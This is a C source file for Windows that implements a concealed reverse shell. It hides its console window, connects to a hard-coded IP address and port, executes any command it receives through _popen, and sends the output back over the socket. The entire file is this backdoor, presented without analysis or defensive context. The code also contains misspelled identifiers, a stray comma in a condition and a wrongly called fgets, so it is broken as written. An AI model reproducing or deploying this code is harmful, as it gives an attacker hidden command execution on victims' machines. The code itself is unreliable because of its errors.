#pragma comment(lib, "ws2_32.lib")

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#define _WIN32_WINNT 0x0500

#include <windows.h>

#define PORT 50000
#define CLIENT "192.168.0.39"


int main(void)
{
	HWND fenetre = GetConsoleWindow();
	ShowWindow(fenetre, SW_MINIMIZE);
	ShowWindow(fenetre, SW_HIDE);

	WSADATA WSAData;

	int erreur = WSAStartup(MAKEWORD(2, 2), &WSAData);

	SOCKET sock;
	

	SOCKADDR_IN sin;

	char buffer[999] = "";

	if (!erreur)
	{
		sock = socket(AF_INET, SOCK_STREAM, 0);

		sin.sin_addr.s_addr = inet_addr(CLIENT);


		sin.sin_family = AF_INET;
		

		sin.sin_port = htons(PORT);

		if (connect(sock, (SOCKADRR*)& sin, sizeof(sin)), != SOCKET_ERROR)
		{
			while (recv(sock, buffer, 999, 0) != SOCKET_ERROR)
			{
				FILE* fp;
				char path[999];

				fp = _popen(buffer, "r");

				char buffer[9999] = "";

				while (fgets(path, sizeof(path), -1, fp) != NULL)
				{
					strcat(buffer, path);
				}

				send(sock, buffer, strlen(buffer)+1, 0);

				_pclose(fp);
			}
		}
		closesocket(sock);
		WSACmeanup();
	}
	return 0;
}










